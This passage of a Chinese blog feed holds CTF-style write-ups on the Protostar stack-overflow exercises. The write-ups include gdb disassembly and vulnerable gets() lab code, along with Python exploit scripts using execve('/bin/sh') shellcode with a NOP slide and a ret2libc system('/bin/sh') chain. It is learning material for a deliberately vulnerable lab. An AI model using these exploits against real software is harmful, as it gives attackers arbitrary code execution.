class="number">0</span>&gt;:<span class="keyword">push</span>   <span class="built_in">ebp</span></div><div class="line"><span class="number">0x08048485</span> &lt;getpath+<span class="number">1</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">ebp</span>,<span class="built_in">esp</span></div><div class="line"><span class="number">0x08048487</span> &lt;getpath+<span class="number">3</span>&gt;:<span class="keyword">sub</span>    <span class="built_in">esp</span>,<span class="number">0x68</span></div><div class="line"><span class="number">0x0804848a</span> &lt;getpath+<span class="number">6</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">eax</span>,<span class="number">0x80485d0</span></div><div class="line"><span class="number">0x0804848f</span> &lt;getpath+<span class="number">11</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">esp</span>],<span class="built_in">eax</span></div><div class="line"><span class="number">0x08048492</span> &lt;getpath+<span class="number">14</span>&gt;:<span class="keyword">call</span>   <span class="number">0x80483c0</span> &lt;printf@plt&gt;</div><div class="line"><span class="number">0x08048497</span> &lt;getpath+<span class="number">19</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">eax</span>,<span class="built_in">ds</span>:<span class="number">0x8049720</span></div><div class="line"><span class="number">0x0804849c</span> &lt;getpath+<span class="number">24</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">esp</span>],<span class="built_in">eax</span></div><div class="line"><span class="number">0x0804849f</span> &lt;getpath+<span class="number">27</span>&gt;:<span class="keyword">call</span>   <span class="number">0x80483b0</span> &lt;fflush@plt&gt;</div><div class="line"><span class="number">0x080484a4</span> &lt;getpath+<span class="number">32</span>&gt;:<span class="keyword">lea</span>    <span class="built_in">eax</span>,[<span class="built_in">ebp</span>-<span class="number">0x4c</span>]</div><div class="line"><span class="number">0x080484a7</span> &lt;getpath+<span class="number">35</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">esp</span>],<span class="built_in">eax</span></div><div class="line"><span class="number">0x080484aa</span> &lt;getpath+<span class="number">38</span>&gt;:<span class="keyword">call</span>   <span class="number">0x8048380</span> &lt;gets@plt&gt;</div><div class="line"><span class="number">0x080484af</span> &lt;getpath+<span class="number">43</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">eax</span>,<span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">ebp</span>+<span class="number">0x4</span>]</div><div class="line"><span class="number">0x080484b2</span> &lt;getpath+<span class="number">46</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">ebp</span>-<span class="number">0xc</span>],<span class="built_in">eax</span></div><div class="line"><span class="number">0x080484b5</span> &lt;getpath+<span class="number">49</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">eax</span>,<span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">ebp</span>-<span class="number">0xc</span>]</div><div class="line"><span class="number">0x080484b8</span> &lt;getpath+<span class="number">52</span>&gt;:<span class="keyword">and</span>    <span class="built_in">eax</span>,<span class="number">0xbf000000</span></div><div class="line"><span class="number">0x080484bd</span> &lt;getpath+<span class="number">57</span>&gt;:<span class="keyword">cmp</span>    <span class="built_in">eax</span>,<span class="number">0xbf000000</span></div><div class="line"><span class="number">0x080484c2</span> &lt;getpath+<span class="number">62</span>&gt;:<span class="keyword">jne</span>    <span class="number">0x80484e4</span> &lt;getpath+<span class="number">96</span>&gt;</div><div class="line"><span class="number">0x080484c4</span> &lt;getpath+<span class="number">64</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">eax</span>,<span class="number">0x80485e4</span></div><div class="line"><span class="number">0x080484c9</span> &lt;getpath+<span class="number">69</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">edx</span>,<span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">ebp</span>-<span class="number">0xc</span>]</div><div class="line"><span class="number">0x080484cc</span> &lt;getpath+<span class="number">72</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">esp</span>+<span class="number">0x4</span>],<span class="built_in">edx</span></div><div class="line"><span class="number">0x080484d0</span> &lt;getpath+<span class="number">76</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">esp</span>],<span class="built_in">eax</span></div><div class="line"><span class="number">0x080484d3</span> &lt;getpath+<span class="number">79</span>&gt;:<span class="keyword">call</span>   <span class="number">0x80483c0</span> &lt;printf@plt&gt;</div><div class="line"><span class="number">0x080484d8</span> &lt;getpath+<span class="number">84</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">esp</span>],<span class="number">0x1</span></div><div class="line"><span class="number">0x080484df</span> &lt;getpath+<span class="number">91</span>&gt;:<span class="keyword">call</span>   <span class="number">0x80483a0</span> &lt;_exit@plt&gt;</div><div class="line"><span class="number">0x080484e4</span> &lt;getpath+<span class="number">96</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">eax</span>,<span class="number">0x80485f0</span></div><div class="line"><span class="number">0x080484e9</span> &lt;getpath+<span class="number">101</span>&gt;:<span class="keyword">lea</span>    <span class="built_in">edx</span>,[<span class="built_in">ebp</span>-<span class="number">0x4c</span>]</div><div class="line"><span class="number">0x080484ec</span> &lt;getpath+<span class="number">104</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">esp</span>+<span class="number">0x4</span>],<span class="built_in">edx</span></div><div class="line"><span class="number">0x080484f0</span> &lt;getpath+<span class="number">108</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">esp</span>],<span class="built_in">eax</span></div><div class="line"><span class="number">0x080484f3</span> &lt;getpath+<span class="number">111</span>&gt;:<span class="keyword">call</span>   <span class="number">0x80483c0</span> &lt;printf@plt&gt;</div><div class="line"><span class="number">0x080484f8</span> &lt;getpath+<span class="number">116</span>&gt;:<span class="keyword">leave</span>  </div><div class="line"><span class="number">0x080484f9</span> &lt;getpath+<span class="number">117</span>&gt;:<span class="keyword">ret</span></div></pre></td></tr></table></figure><h3 id="调试-amp-hack"><a href="#调试-amp-hack" class="headerlink" title="调试&amp;hack"></a>调试&amp;hack</h3><p>测试返回地址等在这里就省略了，还不明白的可以看前面的系列。这里先看下python脚本。</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">import struct</div><div class="line">padding =  'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTT'</div><div class="line">ret  = struct.pack("I", 0x080484f9)</div><div class="line">eip_after_ret = struct.pack("I", 0xbffff78c+40)</div><div class="line">nopslide = '<span class="symbol">\x</span>90'*100</div><div class="line">payload = '<span class="symbol">\x</span>31<span class="symbol">\x</span>c0<span class="symbol">\x</span>50<span class="symbol">\x</span>68<span class="symbol">\x</span>2f<span class="symbol">\x</span>2f<span class="symbol">\x</span>73<span class="symbol">\x</span>68<span class="symbol">\x</span>68<span class="symbol">\x</span>2f<span class="symbol">\x</span>62<span class="symbol">\x</span>69<span class="symbol">\x</span>6e<span class="symbol">\x</span>89<span class="symbol">\x</span>e3<span class="symbol">\x</span>89<span class="symbol">\x</span>c1<span class="symbol">\x</span>89<span class="symbol">\x</span>c2<span class="symbol">\x</span>b0<span class="symbol">\x</span>0b<span class="symbol">\x</span>cd<span class="symbol">\x</span>80<span class="symbol">\x</span>31<span class="symbol">\x</span>c0<span class="symbol">\x</span>40<span class="symbol">\x</span>cd<span class="symbol">\x</span>80'</div><div class="line">print padding+ret+eip_after_ret+nopslide+payload</div></pre></td></tr></table></figure><p>这里的ret返回地址我们改为了<code>0x080484f9</code>正是ret指令处的地址。eip_after_ret为真正在栈上跳转的执行地址，当然我们也加入了nopslide。</p><p>here we go!</p><p><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-Stack%203/3-0.png?raw=true" alt="3-0"></p><p>成功运行bash！</p><h2 id="0x04-Ret2libc"><a href="#0x04-Ret2libc" class="headerlink" title="0x04 Ret2libc"></a>0x04 Ret2libc</h2><p>这次我们通过返回到libc里面的函数达到执行shell的目的。这里采用<code>system(&quot;/bin/sh&quot;)</code>。所以我们需要跳转到system函数，但同时要满足x86传参方式即要先将字符串<code>&quot;/bin/sh&quot;</code>压入栈中。下面我们就来做两件事：</p><pre><code>*  1，找到system在内存中的地址*  2，找到字符串`&quot;/bin/sh&quot;`在内存中的地址</code></pre><h3 id="system-amp-quot-bin-sh-quot"><a href="#system-amp-quot-bin-sh-quot" class="headerlink" title="system &amp; &quot;/bin/sh&quot;"></a><code>system</code> &amp; <code>&quot;/bin/sh&quot;</code></h3><p>  <img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-Stack%203/3-1.png?raw=true" alt="3-1"><br>  先找到<code>/lib/libc-2.11.2.so</code>在内存中的位置<br>  <img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-Stack%203/3-2.png?raw=true" alt="3-2"><br>  然后找到字符串<code>&quot;/bin/sh&quot;</code>在<code>/lib/libc-2.11.2.so</code>中的偏移<br> <img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-Stack%203/3-3.png?raw=true" alt="3-3"><br>验证：所以<code>&quot;/bin/sh&quot;</code>为<code>0xb7fb63bf</code><br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-Stack%203/3-4.png?raw=true" alt="3-4"></p><h3 id="hack"><a href="#hack" class="headerlink" title="hack"></a>hack</h3><p>编写对应的Python脚本</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> struct</div><div class="line">padding =  <span class="string">'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTT'</span></div><div class="line"><span class="keyword">system</span>  = struct.pack(<span class="string">"I"</span>,<span class="number">0xb7ecffb0</span>) #<span class="keyword">system</span>地址</div><div class="line"></div><div class="line">ret_after_system = <span class="string">'AAAA'</span> #返回地址，不重要</div><div class="line">bin_sh = struct.pack(<span class="string">"I"</span>, <span class="number">0xb7fb63bf</span>) #参数/bin/sh地址</div><div class="line">print padding+<span class="keyword">system</span>+ret_after_system+bin_sh</div></pre></td></tr></table></figure><h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-Stack%203/3-5.png?raw=true" alt="3-5"></p><h3 id="cooooool-make-it"><a href="#cooooool-make-it" class="headerlink" title="cooooool! make it!"></a>cooooool! make it!</h3><h2 id="0x05-小结"><a href="#0x05-小结" class="headerlink" title="0x05 小结"></a>0x05 小结</h2><p>学习到现在，一句话总结就是：你知道得越多才知道知道得越少。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-序&quot;&gt;&lt;a href=&quot;#0x00-序&quot; class=&quot;headerlink&quot; title=&quot;0x00 序&quot;&gt;&lt;/a&gt;0x00 序&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt; 和前面的栈溢出系列，我们覆盖了返回地址，通过ret控制eip使其执行我们在栈上存
      
    
    </summary>
    
      <category term="Linux堆栈漏洞学习系列" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/Linux%E5%A0%86%E6%A0%88%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E7%B3%BB%E5%88%97/"/>
    
    
      <category term="Linux" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Linux/"/>
    
      <category term="Protostar" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Protostar/"/>
    
      <category term="栈溢出" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
    
  </entry>
  
  <entry>
    <title>Protostar-栈溢出学习-ret跳转到自定义shellcode</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2017/04/15/Protostar-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-Stack%202/Protostar-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-Stack%202/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2017/04/15/Protostar-栈溢出系列学习-Stack 2/Protostar-栈溢出系列学习-Stack 2/</id>
    <published>2017-04-15T03:12:19.000Z</published>
    <updated>2017-05-02T14:33:44.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-序"><a href="#0x00-序" class="headerlink" title="0x00 序"></a>0x00 序</h2><blockquote><p> 经过前面的学习，我们已经了解了简单的栈溢出利用手段，建议看本文章前先看下前面的分析。这次我们来做点有趣的事，我们引入shellcode。</p></blockquote><h2 id="0x01-C语言源代码"><a href="#0x01-C语言源代码" class="headerlink" title="0x01 C语言源代码"></a>0x01 C语言源代码</h2><p>Stack5 is a standard buffer overflow, this time introducing shellcode.</p><p>This level is at /opt/protostar/bin/stack5</p><p>Hints:<br>At this point in time, it might be easier to use someone elses shellcode<br>If debugging the shellcode, use \xcc (int3) to stop the program executing and return to the debugger<br>remove the int3s once your shellcode is done.</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="keyword">int</span> main(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</div><div class="line">&#123;</div><div class="line">  <span class="keyword">char</span> <span class="built_in">buffer</span>[<span class="number">64</span>];</div><div class="line"></div><div class="line">  gets(<span class="built_in">buffer</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure><h2 id="0x02-思路-amp-分析"><a href="#0x02-思路-amp-分析" class="headerlink" title="0x02 思路&amp;分析"></a>0x02 思路&amp;分析</h2><p>和前面的一样，我们可以通过覆盖返回地址然后由ret指令跳转到目标地址，但这次我们没有了win()函数，那我们应该跳转到哪里呢？没错，还是跳到栈上。要达到执行代码的目的，所以我们需要在栈上写入shellcode。Here we go！</p><h2 id="0x03-调试-amp-hack"><a href="#0x03-调试-amp-hack" class="headerlink" title="0x03 调试&amp;hack"></a>0x03 调试&amp;hack</h2><ul><li>对应汇编，我们在<code>0x080483da &lt;main+22&gt;:    ret</code>处下个断点</li></ul><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">(gdb) disassemble </div><div class="line">Dump of assembler code for function main:</div><div class="line"><span class="number">0x080483c4</span> &lt;main+<span class="number">0</span>&gt;:<span class="keyword">push</span>   %ebp</div><div class="line"><span class="number">0x080483c5</span> &lt;main+<span class="number">1</span>&gt;:<span class="keyword">mov</span>    %esp,%ebp</div><div class="line"><span class="number">0x080483c7</span> &lt;main+<span class="number">3</span>&gt;:<span class="keyword">and</span>    <span class="number">$0</span>xfffffff0,%esp</div><div class="line"><span class="number">0x080483ca</span> &lt;main+<span class="number">6</span>&gt;:<span class="keyword">sub</span>    <span class="number">$0</span>x50,%esp</div><div class="line"><span class="number">0x080483cd</span> &lt;main+<span class="number">9</span>&gt;:<span class="keyword">lea</span>    <span class="number">0x10</span>(%esp),%eax</div><div class="line"><span class="number">0x080483d1</span> &lt;main+<span class="number">13</span>&gt;:<span class="keyword">mov</span>    %eax,(%esp)</div><div class="line"><span class="number">0x080483d4</span> &lt;main+<span class="number">16</span>&gt;:<span class="keyword">call</span>   <span class="number">0x80482e8</span> &lt;gets@plt&gt;</div><div class="line"><span class="number">0x080483d9</span> &lt;main+<span class="number">21</span>&gt;:<span class="keyword">leave</span>  </div><div class="line"><span class="number">0x080483da</span> &lt;main+<span class="number">22</span>&gt;:<span class="keyword">ret</span></div></pre></td></tr></table></figure><ul><li><p>同样的方法，Python脚本测试返回地址</p><p><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-Stack%202/2-0.png?raw=true" alt="2-0"><br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-Stack%202/2-1.png?raw=true" alt="2-1"><br>可以发现<code>0xbffff79c</code>处正是返回地址，对应到TTTT,我需要在TTTT处写上我们要跳转的地址。</p><p>既然题目中说了用<code>int 3 cc指令</code>那我们就先来测试下–[cc指令（见文章末尾）]<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-Stack%202/2-2.png?raw=true" alt="2-2"><br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-Stack%202/2-3.png?raw=true" alt="2-3"><br>我们成功执行了<code>cc INT 3指令</code>并触发 SIGTRAP</p></li><li><p>引入nop slide<br>为什么需要nop slide?<br>来看看这种情况，我们再启动一个终端去调试。<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-Stack%202/2-4.png?raw=true" alt="2-4"><br>发现地址里面内容一样，但地址却不同，为什么会这样呢？再看看整个栈的情况<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-Stack%202/2-5.png?raw=true" alt="2-5"><br>可以发现，在圈中之后的栈地址都相同，但由于工作路径不同，导致前面的栈地址都发生了变化。<br>因此，我们需要引入nop slide去解决这种情况。</p></li><li><p>填写shellcode<br>自此，我们可以加入我们的shellcode了。这里我用的<a href="http://shell-storm.org/shellcode/files/shellcode-811.php" target="_blank" rel="external">这里</a>的shellcode。<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-Stack%202/2-6.png?raw=true" alt="2-6"></p></li></ul><p><strong>现在我们重新编写Python脚本，制作shellcode payload</strong></p><p><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-Stack%202/2-7.png?raw=true" alt="2-7"></p><p>我们已经跳转的地址已经变化了40字节，并加入100的nopslide偏移，然后再执行shellcode</p><ul><li><p>运行测试<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-Stack%202/2-8.png?raw=true" alt="2-8"><br>的确执行了dash，但并没有出现运行结果，这里很容易困惑。<br>不应该这样的啊？<br>经过思考，原来我们执行了<code>/bin/dash</code>后，并没有输入任何数据，所以就退出了。</p><p>那怎么才能让执行后输入数据呢？<br>这里有一个小技巧，在执行后用<code>cat</code>指令，将输入转到输出<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-Stack%202/2-9.png?raw=true" alt="2-9"></p></li></ul><h4 id="so-cool-make-it"><a href="#so-cool-make-it" class="headerlink" title="so cool! make it!"></a>so cool! make it!</h4><h2 id="0x04-附录"><a href="#0x04-附录" class="headerlink" title="0x04 附录"></a>0x04 附录</h2><p>INT 3 CC</p><p>详细分分析可以看这边文章<a href="http://blog.csdn.net/trochiluses/article/details/20209593" target="_blank" rel="external">int 3中断与软件调试</a></p><p>简单的理解就是:当我们调试程序时，可以在可能有问题的地方插入一条INT 3指令，使CPU执行到这一点时停下来。这便是软件调试中经常用到的断点（breakpoint）功能，因此INT 3指令又被称为断点指令。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-序&quot;&gt;&lt;a href=&quot;#0x00-序&quot; class=&quot;headerlink&quot; title=&quot;0x00 序&quot;&gt;&lt;/a&gt;0x00 序&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt; 经过前面的学习，我们已经了解了简单的栈溢出利用手段，建议看本文章前先看下前面的分
      
    
    </summary>
    
      <category term="Linux堆栈漏洞学习系列" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/Linux%E5%A0%86%E6%A0%88%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E7%B3%BB%E5%88%97/"/>
    
    
      <category term="Linux" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Linux/"/>
    
      <category term="Protostar" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Protostar/"/>
    
      <category term="栈溢出" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
    
  </entry>
  
  <entry>
    <title>Protostar-栈溢出学习-覆盖栈函数指针和ret指令控制eip</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2017/04/13/Protostar-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-Stack%201/Protostar-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-Stack%201/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2017/04/13/Protostar-栈溢出系列学习-Stack 1/Protostar-栈溢出系列学习-Stack 1/</id>
    <published>2017-04-13T03:12:19.000Z</published>
    <updated>2017-05-02T14:33:33.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-序"><a href="#0x00-序" class="headerlink" title="0x00 序"></a>0x00 序</h2><blockquote><p> 接着之前的系列，下面研究两种控制eip的方式</p></blockquote><h2 id="0x01-C语言源代码"><a href="#0x01-C语言源代码" class="headerlink" title="0x01 C语言源代码"></a>0x01 C语言源代码</h2><p>Stack3 looks at environment variables, and how they can be set, and overwriting function pointers stored on the stack (as a prelude to overwriting the saved EIP)</p><p>Hints:<br>both gdb and objdump is your friend you determining where the win() function lies in memory.</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">win</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">  <span class="built_in">printf</span>(<span class="string">"code flow successfully changed\n"</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></div><div class="line">&#123;</div><div class="line">  <span class="function"><span class="keyword">volatile</span> <span class="title">int</span> <span class="params">(*fp)</span><span class="params">()</span></span>;</div><div class="line">  <span class="keyword">char</span> buffer[<span class="number">64</span>];</div><div class="line"></div><div class="line">  fp = <span class="number">0</span>;</div><div class="line"></div><div class="line">  gets(buffer);</div><div class="line"></div><div class="line">  <span class="keyword">if</span>(fp) &#123;</div><div class="line">      <span class="built_in">printf</span>(<span class="string">"calling function pointer, jumping to 0x%08x\n"</span>, fp);</div><div class="line">      fp();</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure><ul><li><p>在main函数下断点，分析可知，1处为fp的地址，2处为fp()的调用，我们需要覆盖掉esp+0x5c处所存的函数指针值，使其跳转到win()函数<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-Stack%201/1-0.png?raw=true" alt="1-0"></p></li><li><p>利用Python编写exp测试脚本，可以发现QQQQ覆盖了函数指针<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-Stack%201/1-1.png?raw=true" alt="1-1"><br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-Stack%201/1-2.png?raw=true" alt="1-2"><br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-Stack%201/1-3.png?raw=true" alt="1-3"><br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-Stack%201/1-4.png?raw=true" alt="1-4"></p></li></ul><ul><li>重新编写exp,将QQQQ改为win()函数的地址，即可实现自定义调用，控制eip</li></ul><p><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-Stack%201/1-5.png?raw=true" alt="1-5"><br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-Stack%201/1-6.png?raw=true" alt="1-6"></p><p><strong>成功执行win()函数</strong></p><p><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-Stack%201/1-7.png?raw=true" alt="1-7"></p><h2 id="0x02-通过ret指令控制eip"><a href="#0x02-通过ret指令控制eip" class="headerlink" title="0x02 通过ret指令控制eip"></a>0x02 通过ret指令控制eip</h2><p>Stack4 takes a look at overwriting saved EIP and standard buffer overflows.</p><p>This level is at /opt/protostar/bin/stack4</p><p>Hints:<br>A variety of introductory papers into buffer overflows may help.<br>gdb lets you do “run &lt; input”<br>EIP is not directly after the end of buffer, compiler padding can also increase the size.</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div 